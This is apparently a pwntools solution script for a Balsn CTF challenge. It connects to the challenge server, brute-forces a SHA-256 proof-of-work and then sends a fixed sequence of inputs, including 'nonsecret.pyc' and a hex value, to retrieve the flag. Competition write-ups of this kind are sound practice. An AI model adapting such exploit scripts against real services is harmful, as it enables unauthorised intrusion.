from pwn import *
import hashlib


r=remote("flagsss.balsnctf.com",10121)

## pow

temp=r.recvuntil("sha256( ")
prefix=r.recvline().split()[0]
i=0
while True:
  data=prefix+str(i)
  Hash=hashlib.sha256(data)
  if Hash.hexdigest()[:5]=="0"*5:
    r.sendline(str(i))
    break
  i+=1

## get flag
r.sendline("1")
r.sendline("nonsecret.pyc")
r.sendline("91ffff64b0fd")
r.sendline("73")
r.sendline("3")
r.interactive()

